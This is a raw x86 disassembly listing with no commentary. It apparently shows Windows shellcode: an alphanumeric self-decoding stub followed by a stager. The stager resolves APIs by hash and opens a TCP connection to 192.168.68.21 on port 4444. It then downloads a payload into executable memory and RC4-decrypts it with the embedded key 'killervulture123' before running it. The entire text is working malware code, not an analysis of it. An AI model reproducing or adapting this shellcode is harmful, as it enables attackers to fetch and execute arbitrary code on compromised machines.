401000h 56                   push   esi
401001h 00 56 00             add    byte ptr [esi], dl
401004h 59                   pop    ecx
401005h 00 41 00             add    byte ptr [ecx], al
401008h 49                   dec    ecx
401009h 00 41 00             add    byte ptr [ecx], al
40100Ch 49                   dec    ecx
40100Dh 00 41 00             add    byte ptr [ecx], al
401010h 49                   dec    ecx
401011h 00 41 00             add    byte ptr [ecx], al
401014h 49                   dec    ecx
401015h 00 41 00             add    byte ptr [ecx], al
401018h 49                   dec    ecx
401019h 00 41 00             add    byte ptr [ecx], al
40101Ch 49                   dec    ecx
40101Dh 00 41 00             add    byte ptr [ecx], al
401020h 49                   dec    ecx
401021h 00 41 00             add    byte ptr [ecx], al
401024h 49                   dec    ecx
401025h 00 41 00             add    byte ptr [ecx], al
401028h 49                   dec    ecx
401029h 00 41 00             add    byte ptr [ecx], al
40102Ch 49                   dec    ecx
40102Dh 00 41 00             add    byte ptr [ecx], al
401030h 49                   dec    ecx
401031h 00 41 00             add    byte ptr [ecx], al
401034h 49                   dec    ecx
401035h 00 41 00             add    byte ptr [ecx], al
401038h 49                   dec    ecx
401039h 00 41 00             add    byte ptr [ecx], al
40103Ch 49                   dec    ecx
40103Dh 00 41 00             add    byte ptr [ecx], al
401040h 6A 00                push   0
401042h 58                   pop    eax
401043h 00 41 00             add    byte ptr [ecx], al
401046h 51                   push   ecx
401047h 00 41 00             add    byte ptr [ecx], al
40104Ah 44                   inc    esp
40104Bh 00 41 00             add    byte ptr [ecx], al
40104Eh 5A                   pop    edx
40104Fh 00 41 00             add    byte ptr [ecx], al
401052h 42                   inc    edx
401053h 00 41 00             add    byte ptr [ecx], al
401056h 52                   push   edx
401057h 00 41 00             add    byte ptr [ecx], al
40105Ah 4C                   dec    esp
40105Bh 00 41 00             add    byte ptr [ecx], al
40105Eh 59                   pop    ecx
40105Fh 00 41 00             add    byte ptr [ecx], al
401062h 49                   dec    ecx
401063h 00 41 00             add    byte ptr [ecx], al
401066h 51                   push   ecx
401067h 00 41 00             add    byte ptr [ecx], al
40106Ah 49                   dec    ecx
40106Bh 00 41 00             add    byte ptr [ecx], al
40106Eh 51                   push   ecx
40106Fh 00 41 00             add    byte ptr [ecx], al
401072h 49                   dec    ecx
401073h 00 41 00             add    byte ptr [ecx], al
401076h 68 00 41 00 41       push   0x41004100
40107Bh 00 41 00             add    byte ptr [ecx], al
40107Eh 5A                   pop    edx
40107Fh 00 31                add    byte ptr [ecx], dh
401081h 00 41 00             add    byte ptr [ecx], al
401084h 49                   dec    ecx
401085h 00 41 00             add    byte ptr [ecx], al
401088h 49                   dec    ecx
401089h 00 41 00             add    byte ptr [ecx], al
40108Ch 4A                   dec    edx
40108Dh 00 31                add    byte ptr [ecx], dh
40108Fh 00 31                add    byte ptr [ecx], dh
401091h 00 41 00             add    byte ptr [ecx], al
401094h 49                   dec    ecx
401095h 00 41 00             add    byte ptr [ecx], al
401098h 49                   dec    ecx
401099h 00 41 00             add    byte ptr [ecx], al
40109Ch 42                   inc    edx
40109Dh 00 41 00             add    byte ptr [ecx], al
4010A0h 42                   inc    edx
4010A1h 00 41 00             add    byte ptr [ecx], al
4010A4h 42                   inc    edx
4010A5h 00 51 00             add    byte ptr [ecx], dl
4010A8h 49                   dec    ecx
4010A9h 00 31                add    byte ptr [ecx], dh
4010ABh 00 41 00             add    byte ptr [ecx], al
4010AEh 49                   dec    ecx
4010AFh 00 51 00             add    byte ptr [ecx], dl
4010B2h 49                   dec    ecx
4010B3h 00 41 00             add    byte ptr [ecx], al
4010B6h 49                   dec    ecx
4010B7h 00 51 00             add    byte ptr [ecx], dl
4010BAh 49                   dec    ecx
4010BBh 00 31                add    byte ptr [ecx], dh
4010BDh 00 31                add    byte ptr [ecx], dh
4010BFh 00 31                add    byte ptr [ecx], dh
4010C1h 00 41 00             add    byte ptr [ecx], al
4010C4h 49                   dec    ecx
4010C5h 00 41 00             add    byte ptr [ecx], al
4010C8h 4A                   dec    edx
4010C9h 00 51 00             add    byte ptr [ecx], dl
4010CCh 59                   pop    ecx
4010CDh 00 41 00             add    byte ptr [ecx], al
4010D0h 5A                   pop    edx
4010D1h 00 42 00             add    byte ptr [edx], al
4010D4h 41                   inc    ecx
4010D5h 00 42 00             add    byte ptr [edx], al
4010D8h 41                   inc    ecx
4010D9h 00 42 00             add    byte ptr [edx], al
4010DCh 41                   inc    ecx
4010DDh 00 42 00             add    byte ptr [edx], al
4010E0h 41                   inc    ecx
4010E1h 00 42 00             add    byte ptr [edx], al
4010E4h 6B 01 10             imul   eax, dword ptr [ecx], 0x10
4010E7h 02 41 02             add    al, byte ptr [ecx + 2]
4010EAh 88 02                mov    byte ptr [edx], al
4010ECh 42                   inc    edx
4010EDh 80 39 41             cmp    byte ptr [ecx], 0x41
4010F0h 75 E2                jne    0x4010d4
4010F2h FC                   cld    
4010F3h E8 82 00 00 00       call   0x40117a
4010F8h 60                   pushal 
4010F9h 89 E5                mov    ebp, esp
4010FBh 31 C0                xor    eax, eax
4010FDh 64 8B 50 30          mov    edx, dword ptr fs:[eax + 0x30]
401101h 8B 52 0C             mov    edx, dword ptr [edx + 0xc]
401104h 8B 52 14             mov    edx, dword ptr [edx + 0x14]
401107h 8B 72 28             mov    esi, dword ptr [edx + 0x28]
40110Ah 0F B7 4A 26          movzx  ecx, word ptr [edx + 0x26]
40110Eh 31 FF                xor    edi, edi
401110h AC                   lodsb  al, byte ptr [esi]
401111h 3C 61                cmp    al, 0x61
401113h 7C 02                jl     0x401117
401115h 2C 20                sub    al, 0x20
401117h C1 CF 0D             ror    edi, 0xd
40111Ah 01 C7                add    edi, eax
40111Ch E2 F2                loop   0x401110
40111Eh 52                   push   edx
40111Fh 57                   push   edi
401120h 8B 52 10             mov    edx, dword ptr [edx + 0x10]
401123h 8B 4A 3C             mov    ecx, dword ptr [edx + 0x3c]
401126h 8B 4C 11 78          mov    ecx, dword ptr [ecx + edx + 0x78]
40112Ah E3 48                jecxz  0x401174
40112Ch 01 D1                add    ecx, edx
40112Eh 51                   push   ecx
40112Fh 8B 59 20             mov    ebx, dword ptr [ecx + 0x20]
401132h 01 D3                add    ebx, edx
401134h 8B 49 18             mov    ecx, dword ptr [ecx + 0x18]
401137h E3 3A                jecxz  0x401173
401139h 49                   dec    ecx
40113Ah 8B 34 8B             mov    esi, dword ptr [ebx + ecx*4]
40113Dh 01 D6                add    esi, edx
40113Fh 31 FF                xor    edi, edi
401141h AC                   lodsb  al, byte ptr [esi]
401142h C1 CF 0D             ror    edi, 0xd
401145h 01 C7                add    edi, eax
401147h 38 E0                cmp    al, ah
401149h 75 F6                jne    0x401141
40114Bh 03 7D F8             add    edi, dword ptr [ebp - 8]
40114Eh 3B 7D 24             cmp    edi, dword ptr [ebp + 0x24]
401151h 75 E4                jne    0x401137
401153h 58                   pop    eax
401154h 8B 58 24             mov    ebx, dword ptr [eax + 0x24]
401157h 01 D3                add    ebx, edx
401159h 66 8B 0C 4B          mov    cx, word ptr [ebx + ecx*2]
40115Dh 8B 58 1C             mov    ebx, dword ptr [eax + 0x1c]
401160h 01 D3                add    ebx, edx
401162h 8B 04 8B             mov    eax, dword ptr [ebx + ecx*4]
401165h 01 D0                add    eax, edx
401167h 89 44 24 24          mov    dword ptr [esp + 0x24], eax
40116Bh 5B                   pop    ebx
40116Ch 5B                   pop    ebx
40116Dh 61                   popal  
40116Eh 59                   pop    ecx
40116Fh 5A                   pop    edx
401170h 51                   push   ecx
401171h FF E0                jmp    eax
401173h 5F                   pop    edi
401174h 5F                   pop    edi
401175h 5A                   pop    edx
401176h 8B 12                mov    edx, dword ptr [edx]
401178h EB 8D                jmp    0x401107
40117Ah 5D                   pop    ebp
40117Bh 68 33 32 00 00       push   0x3233
401180h 68 77 73 32 5F       push   0x5f327377
401185h 54                   push   esp
401186h 68 4C 77 26 07       push   0x726774c
40118Bh FF D5                call   ebp
40118Dh B8 90 01 00 00       mov    eax, 0x190
401192h 29 C4                sub    esp, eax
401194h 54                   push   esp
401195h 50                   push   eax
401196h 68 29 80 6B 00       push   0x6b8029
40119Bh FF D5                call   ebp
40119Dh 50                   push   eax
40119Eh 50                   push   eax
40119Fh 50                   push   eax
4011A0h 50                   push   eax
4011A1h 40                   inc    eax
4011A2h 50                   push   eax
4011A3h 40                   inc    eax
4011A4h 50                   push   eax
4011A5h 68 EA 0F DF E0       push   0xe0df0fea
4011AAh FF D5                call   ebp
4011ACh 97                   xchg   eax, edi
4011ADh 6A 05                push   5
4011AFh 68 C0 A8 44 15       push   0x1544a8c0
4011B4h 68 02 00 11 5C       push   0x5c110002
4011B9h 89 E6                mov    esi, esp
4011BBh 6A 10                push   0x10
4011BDh 56                   push   esi
4011BEh 57                   push   edi
4011BFh 68 99 A5 74 61       push   0x6174a599
4011C4h FF D5                call   ebp
4011C6h 85 C0                test   eax, eax
4011C8h 74 0C                je     0x4011d6
4011CAh FF 4E 08             dec    dword ptr [esi + 8]
4011CDh 75 EC                jne    0x4011bb
4011CFh 68 F0 B5 A2 56       push   0x56a2b5f0
4011D4h FF D5                call   ebp
4011D6h 6A 00                push   0
4011D8h 6A 04                push   4
4011DAh 56                   push   esi
4011DBh 57                   push   edi
4011DCh 68 02 D9 C8 5F       push   0x5fc8d902
4011E1h FF D5                call   ebp
4011E3h 8B 36                mov    esi, dword ptr [esi]
4011E5h 81 F6 4B 58 4F 52    xor    esi, 0x524f584b
4011EBh 8D 0E                lea    ecx, [esi]
4011EDh 6A 40                push   0x40
4011EFh 68 00 10 00 00       push   0x1000
4011F4h 51                   push   ecx
4011F5h 6A 00                push   0
4011F7h 68 58 A4 53 E5       push   0xe553a458
4011FCh FF D5                call   ebp
4011FEh 8D 98 00 01 00 00    lea    ebx, [eax + 0x100]
401204h 53                   push   ebx
401205h 56                   push   esi
401206h 50                   push   eax
401207h 6A 00                push   0
401209h 56                   push   esi
40120Ah 53                   push   ebx
40120Bh 57                   push   edi
40120Ch 68 02 D9 C8 5F       push   0x5fc8d902
401211h FF D5                call   ebp
401213h 01 C3                add    ebx, eax
401215h 29 C6                sub    esi, eax
401217h 75 EE                jne    0x401207
401219h 5B                   pop    ebx
40121Ah 59                   pop    ecx
40121Bh 5D                   pop    ebp
40121Ch 55                   push   ebp
40121Dh 57                   push   edi
40121Eh 89 DF                mov    edi, ebx
401220h E8 10 00 00 00       call   0x401235
401225h 6B 69 6C 6C          imul   ebp, dword ptr [ecx + 0x6c], 0x6c
401229h 65 72 76             jb     0x4012a2
40122Ch 75 6C                jne    0x40129a
40122Eh 74 75                je     0x4012a5
401230h 72 65                jb     0x401297
401232h 31 32                xor    dword ptr [edx], esi
401234h 33 5E 31             xor    ebx, dword ptr [esi + 0x31]
401237h C0 AA FE C0 75 FB 81 shr    byte ptr [edx - 0x48a3f02], 0x81
40123Eh EF                   out    dx, eax
40123Fh 00 01                add    byte ptr [ecx], al
401241h 00 00                add    byte ptr [eax], al
401243h 31 DB                xor    ebx, ebx
401245h 02 1C 07             add    bl, byte ptr [edi + eax]
401248h 89 C2                mov    edx, eax
40124Ah 80 E2 0F             and    dl, 0xf
40124Dh 02 1C 16             add    bl, byte ptr [esi + edx]
401250h 8A 14 07             mov    dl, byte ptr [edi + eax]
401253h 86 14 1F             xchg   byte ptr [edi + ebx], dl
401256h 88 14 07             mov    byte ptr [edi + eax], dl
401259h FE C0                inc    al
40125Bh 75 E8                jne    0x401245
40125Dh 31 DB                xor    ebx, ebx
40125Fh FE C0                inc    al
401261h 02 1C 07             add    bl, byte ptr [edi + eax]
401264h 8A 14 07             mov    dl, byte ptr [edi + eax]
401267h 86 14 1F             xchg   byte ptr [edi + ebx], dl
40126Ah 88 14 07             mov    byte ptr [edi + eax], dl
40126Dh 02 14 1F             add    dl, byte ptr [edi + ebx]
401270h 8A 14 17             mov    dl, byte ptr [edi + edx]
401273h 30 55 00             xor    byte ptr [ebp], dl
401276h 45                   inc    ebp
401277h 49                   dec    ecx
401278h 75 E5                jne    0x40125f
40127Ah 5F                   pop    edi
40127Bh C3                   ret    
40127Ch 51                   push   ecx